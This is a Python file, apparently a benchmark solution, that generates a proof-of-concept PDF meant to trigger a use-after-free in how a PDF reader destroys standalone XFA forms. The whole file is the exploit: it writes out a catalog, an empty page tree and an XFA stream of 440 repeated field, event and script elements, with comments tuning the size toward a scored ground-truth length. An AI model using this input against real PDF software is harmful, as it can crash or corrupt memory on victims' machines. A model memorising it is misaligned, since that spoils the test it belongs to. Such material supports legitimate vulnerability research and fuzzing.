import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # The vulnerability is related to the destruction of standalone XFA forms,
        # where a reference counting error occurs. To trigger this, we construct
        # a PDF with a large, complex XFA form.
        #
        # The core idea is to repeat a specific XML structure many times. This
        # increases the likelihood of hitting the vulnerable code path during
        # parsing and object model construction. The repetition also helps
        # create a memory state where the use-after-free bug leads to a
        # detectable crash.
        #
        # We use a pattern of a <field> containing an <event> with a <script>.
        # This structure often involves the creation of dictionary-like objects
        # internally by the parser, which is where the described bug lies.
        #
        # The number of repetitions is tuned to get the PoC size close to the
        # ground-truth length, which optimizes the score.

        num_repetitions = 440

        xml_parts = [
            '<?xml version="1.0" encoding="UTF-8"?>',
            '<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">',
            '<template>',
            '<subform name="form1">',
        ]

        # A compact but valid XFA field structure to be repeated.
        field_pattern = '<field name="f{i}"><event activity="click"><script contentType="application/x-javascript">a;</script></event></field>'
        
        for i in range(num_repetitions):
            xml_parts.append(field_pattern.format(i=i))
          
        xml_parts.extend([
            '</subform>',
            '</template>',
            '</xdp:xdp>',
        ])

        xml_data = "".join(xml_parts).encode('utf-8')

        # Assemble the PDF structure. We keep track of byte offsets for the xref table.
        pdf_parts = []
        offsets = {}
        
        header = b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n'
        pdf_parts.append(header)
        current_offset = len(header)
        
        # Object 1: Catalog (Document Root)
        offsets[1] = current_offset
        obj1 = b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R /AcroForm 3 0 R >>\nendobj\n'
        pdf_parts.append(obj1)
        current_offset += len(obj1)
        
        # Object 2: Pages (Empty, for a "standalone" form)
        offsets[2] = current_offset
        obj2 = b'2 0 obj\n<< /Type /Pages /Kids [] /Count 0 >>\nendobj\n'
        pdf_parts.append(obj2)
        current_offset += len(obj2)

        # Object 3: AcroForm Dictionary
        offsets[3] = current_offset
        obj3 = b'3 0 obj\n<< /XFA 4 0 R >>\nendobj\n'
        pdf_parts.append(obj3)
        current_offset += len(obj3)
        
        # Object 4: XFA Stream containing the XML payload
        offsets[4] = current_offset
        stream_header = f'4 0 obj\n<< /Length {len(xml_data)} >>\nstream\n'.encode('ascii')
        stream_footer = b'\nendstream\nendobj\n'
        obj4 = stream_header + xml_data + stream_footer
        pdf_parts.append(obj4)
        current_offset += len(obj4)
        
        # Cross-Reference (XRef) Table
        xref_offset = current_offset
        
        xref_entries = [b'0000000000 65535 f \n']
        for i in range(1, 5):
            xref_entries.append(f'{offsets[i]:010d} 00000 n \n'.encode('ascii'))

        xref = b'xref\n0 5\n' + b''.join(xref_entries)
        
        # PDF Trailer
        trailer = (
            b'trailer\n'
            b'<< /Size 5 /Root 1 0 R >>\n'
            b'startxref\n'
            f'{xref_offset}\n'.encode('ascii') +
            b'%%EOF\n'
        )
        
        # Combine all parts to form the final PoC file
        poc_content = b"".join(pdf_parts) + xref + trailer
        
        return poc_content